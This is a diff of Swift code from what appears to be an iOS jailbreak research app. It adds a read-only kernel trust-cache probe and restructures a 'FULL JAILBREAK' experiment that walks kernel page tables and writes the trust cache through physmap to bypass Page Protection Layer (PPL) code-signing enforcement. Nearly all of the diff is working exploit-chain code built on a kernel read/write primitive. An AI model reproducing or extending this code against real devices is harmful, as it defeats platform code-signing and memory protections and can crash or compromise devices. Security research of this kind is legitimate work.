@@ -174,6 +174,24 @@ private func safeKread64Physmap(_ va: UInt64) -> UInt64 {
     return ds_kread64_safe(va)
 }
 
+/// Kernel __TEXT/__DATA/heap — NOT physmap (mis-read → copy_validate panic at 0xfffffffb…).
+private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
+    guard va >= 0xfffffff007000000, va < 0xfffffffc00000000 else { return false }
+    if va >= 0xffffffdc00000000 && va < 0xffffffe600000000 { return false }
+    if va >= 0xfffffffa00000000 { return false }
+    return true
+}
+
+private func safeKread64Kernel(_ va: UInt64) -> UInt64 {
+    guard isSafeKernelKreadAddress(va) else { return 0 }
+    return ds_kread64_safe(va)
+}
+
+private func safeKread32Kernel(_ va: UInt64) -> UInt32 {
+    guard isSafeKernelKreadAddress(va) else { return 0 }
+    return ds_kread32_safe(va)
+}
+
 private func safeKwrite64Physmap(_ va: UInt64, _ value: UInt64) -> Bool {
     guard isSafePhysmapKRWAddress(va) else { return false }
     ds_kwrite64(va, value)
@@ -4087,8 +4105,100 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
     }
     
-    // MARK: - Experiment 77: FULL JAILBREAK — Trust Cache Write via Physmap PPL Bypass
-    
+    // MARK: - Experiment 77: Trust Cache Probe (safe) + Inject (physmap)
+
+    /// Read-only probe: direct KRW on kernel __DATA only — no pmap/physmap (panic at 0xfffffffbffffffff).
+    private func expTrustCacheProbeSafe() -> ExperimentResult {
+        let expName = "Trust Cache Probe (Exp 77)"
+        var detail = "Experiment 77: Trust Cache Probe (read-only, KRW-safe)\n"
+        detail += "====================================================\n\n"
+        detail += "Mode: PROBE — tanpa pmap chain / physmap / page-table walk\n"
+        detail += "(penyebab panic: ds_kread ke VA physmap salah)\n\n"
+
+        guard PhysmapConstants.isVerified else {
+            detail += "❌ Jalankan Physmap Access (Exp 74) dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let physmap = PhysmapConstants.loadOrDefault()
+        let kernBase = ds_get_kernel_base()
+        let kernSlide = ds_get_kernel_slide()
+        detail += "gVirtBase: 0x\(String(format: "%llx", physmap.gVirtBase)) (saved)\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", physmap.gPhysBase))\n"
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
+
+        let dataSegBase = PhysmapConstants.dataSegmentBase(kernTextBase: kernBase)
+        let pplDataBase = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernBase)
+        detail += "__DATA: 0x\(String(format: "%llx", dataSegBase))\n"
+        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase))\n\n"
+
+        var tcStructAddr: UInt64 = 0
+        var tcEntryCount: UInt64 = 0
+
+        func tryTrustCachePointer(_ val: UInt64, label: String) -> Bool {
+            guard isSafeKernelKreadAddress(val) else { return false }
+            let tcVer = safeKread32Kernel(val)
+            let tcCnt = safeKread32Kernel(val + 4)
+            guard tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 else { return false }
+            detail += "🎯 Trust cache \(label)!\n"
+            detail += "  ptr: 0x\(String(format: "%llx", val))\n"
+            detail += "  version: \(tcVer), count: \(tcCnt)\n"
+            tcStructAddr = val
+            tcEntryCount = UInt64(tcCnt)
+            return true
+        }
+
+        detail += "=== Scan __DATA.__ppl_data (direct KRW, 16 pages) ===\n"
+        let pplProbe = safeKread64Kernel(pplDataBase)
+        detail += "pplDataBase peek: 0x\(String(format: "%llx", pplProbe))\n"
+        for pageIdx in 0..<16 {
+            let pageBase = pplDataBase &+ UInt64(pageIdx) * 0x4000
+            guard isSafeKernelKreadAddress(pageBase) else { continue }
+            for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
+                let val = safeKread64Kernel(pageBase + off)
+                if tryTrustCachePointer(val, label: "ppl page \(pageIdx)+0x\(String(format: "%x", off))") {
+                    break
+                }
+            }
+            if tcStructAddr != 0 { break }
+        }
+
+        if tcStructAddr == 0 {
+            detail += "\n=== Scan __DATA (512KB, direct KRW) ===\n"
+            for off in stride(from: UInt64(0), to: UInt64(0x80000), by: 8) {
+                let addr = dataSegBase + off
+                guard isSafeKernelKreadAddress(addr) else { continue }
+                let val = safeKread64Kernel(addr)
+                if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
+                    break
+                }
+            }
+        }
+
+        guard tcStructAddr != 0 else {
+            detail += "\n❌ Trust cache tidak ditemukan via direct KRW.\n"
+            detail += "Inject/physmap butuh pmap valid — jangan tap ③ dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "\n=== Sample entries (direct KRW) ===\n"
+        let entriesStart = tcStructAddr + 8
+        for i in 0..<min(3, Int(tcEntryCount)) {
+            let entryAddr = entriesStart + UInt64(i * 22)
+            guard isSafeKernelKreadAddress(entryAddr + 20) else { break }
+            let h0 = safeKread64Kernel(entryAddr)
+            let h1 = safeKread64Kernel(entryAddr + 8)
+            let h2 = safeKread32Kernel(entryAddr + 16)
+            detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
+        }
+
+        detail += "\n✅ PROBE OK — trust cache ditemukan (tanpa physmap read).\n"
+        detail += "Physmap write/inject masih butuh pmap L1 valid — gunakan ③ hanya jika siap risiko panic.\n"
+        PhysmapConstants.markProbeOK()
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+
     /// PPL bypass via physmap write:
     /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
     /// 2. Compute physmap VA for that physical page (bypasses PPL!)
@@ -4099,10 +4209,12 @@ struct AMFIExperimentView: View {
     /// virtual mapping of the same physical memory with DIFFERENT permissions.
     /// Writing through physmap bypasses PPL's page table protections entirely.
     private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool = false) -> ExperimentResult {
-        let expName = dryRun ? "Trust Cache Probe (Exp 77)" : "🏆 FULL JAILBREAK (Exp 77)"
-        var detail = dryRun
-            ? "Experiment 77: Trust Cache Probe (read-only)\n"
-            : "Experiment 77: FULL JAILBREAK — Physmap PPL Bypass\n"
+        if dryRun {
+            return expTrustCacheProbeSafe()
+        }
+
+        let expName = "🏆 FULL JAILBREAK (Exp 77)"
+        var detail = "Experiment 77: FULL JAILBREAK — Physmap PPL Bypass\n"
         detail += "====================================================\n\n"
 
         let physmap = PhysmapConstants.loadOrDefault()
@@ -4111,7 +4223,7 @@ struct AMFIExperimentView: View {
         let kernBase = ds_get_kernel_base()
         let kernSlide = ds_get_kernel_slide()
 
-        detail += "Mode: \(dryRun ? "PROBE (no write)" : "INJECT (physmap write)")\n"
+        detail += "Mode: INJECT (physmap write)\n"
         detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\(PhysmapConstants.isVerified ? "" : " (default)")\n"
         detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
@@ -4275,11 +4387,13 @@ struct AMFIExperimentView: View {
                 let sL3Idx = (scanVA >> 14) & 0x7FF
                 let sL1E = ds_kread64_safe(tteBase + sL1Idx * 8)
                 guard sL1E & 0x3 == 0x3 else { continue }
-                let sL2VA = (sL1E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
-                let sL2E = ds_kread64_safe(sL2VA + sL2Idx * 8)
+                let sL2Phys = sL1E & 0x0000FFFFFFFC0000
+                guard let sL2VA = physmapVA(fromPhysical: sL2Phys, gVirt: gVirtBase, gPhys: gPhysBase) else { continue }
+                let sL2E = safeKread64Physmap(sL2VA + sL2Idx * 8)
                 guard sL2E & 0x3 == 0x3 else { continue }
-                let sL3VA = (sL2E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
-                let sL3E = ds_kread64_safe(sL3VA + sL3Idx * 8)
+                let sL3Phys = sL2E & 0x0000FFFFFFFC0000
+                guard let sL3VA = physmapVA(fromPhysical: sL3Phys, gVirt: gVirtBase, gPhys: gPhysBase) else { continue }
+                let sL3E = safeKread64Physmap(sL3VA + sL3Idx * 8)
                 guard sL3E & 0x3 == 0x3 else { continue }
                 let pagePhys = sL3E & 0x0000FFFFFFFC0000
                 guard let pagePhysmapVA = physmapVA(fromPhysical: pagePhys, gVirt: gVirtBase, gPhys: gPhysBase) else { continue }
@@ -4344,13 +4458,6 @@ struct AMFIExperimentView: View {
             detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
         }
         
-        if dryRun {
-            detail += "\n✅ PROBE OK — trust cache ditemukan, physmap read siap.\n"
-            detail += "Langkah berikutnya: ③ Trust Cache Inject (risiko panic).\n"
-            PhysmapConstants.markProbeOK()
-            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
-        }
-
         guard PhysmapConstants.isVerified else {
             detail += "❌ Exp 74 belum verified — inject dibatalkan\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
